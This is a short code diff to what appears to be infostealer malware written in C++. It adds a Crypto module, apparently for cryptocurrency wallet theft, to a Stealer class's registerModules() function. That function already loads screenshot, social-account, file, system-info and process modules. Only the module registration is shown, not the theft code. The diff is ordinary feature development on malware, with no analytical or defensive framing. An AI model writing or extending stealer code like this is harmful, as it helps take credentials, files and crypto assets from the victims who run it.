@@ -8,11 +8,13 @@
 #include "impl/socials/Socials.h"
 #include "impl/files/Files.h"
 #include "impl/Processes.h"
+#include "impl/crypto/Crypto.h"
 #include <thread>
 
 void Stealer::registerModules() {
     this->modules.push_back(new Screenshot());
     this->modules.push_back(new Socials());
+    this->modules.push_back(new Crypto());
     this->modules.push_back(new Files());
     this->modules.push_back(new Info());
     this->modules.push_back(new Processes());
